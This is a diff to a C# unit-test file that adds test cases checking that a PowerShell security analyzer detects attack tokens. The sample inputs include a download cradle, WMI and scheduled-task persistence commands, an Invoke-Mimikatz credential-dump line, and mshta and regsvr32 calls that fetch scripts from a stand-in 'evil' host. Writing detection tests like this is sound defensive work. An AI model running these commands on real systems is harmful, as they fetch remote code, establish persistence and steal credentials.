@@ -1044,6 +1044,16 @@ public class PowerShellSecurityAnalyzerTests
     // Non-interactive relaunch wrapper - classic hidden-automation evasion.
     [InlineData("Start-Process powershell '-NonInteractive -w hidden -c x'", "non-interactive")]
     [InlineData("powershell -noni -c whoami", "non-interactive")]
+    [InlineData("(New-Object Net.WebClient).DownloadString($u)", "download-cradle")]
+    [InlineData("Register-WmiEvent -Query $q -Action $a", "WMI event-subscription")]
+    [InlineData("Set-WmiInstance -Class CommandLineEventConsumer -Arguments $a", "CommandLineEventConsumer")]
+    [InlineData("Set-WmiInstance -Class ActiveScriptEventConsumer -Arguments $a", "ActiveScriptEventConsumer")]
+    [InlineData("Register-ScheduledTask -TaskName 'x' -Action $a", "scheduled task")]
+    [InlineData("schtasks /create /tn evil /tr calc.exe /sc onlogon", "scheduled task")]
+    [InlineData("Invoke-Mimikatz -Command 'sekurlsa dump'", "Mimikatz")]
+    [InlineData("mshta http://evil/a.hta", "mshta")]
+    [InlineData("regsvr32 /i:http://evil/a.sct scrobj", "regsvr32")]
+    [InlineData("rundll32 javascript:foo", "rundll32")]
     public void ScanProfileContent_ModernAttackTokens_AreDetected(string content, string expectReasonSubstring)
     {
         var reasons = ScanProfileContent(content);
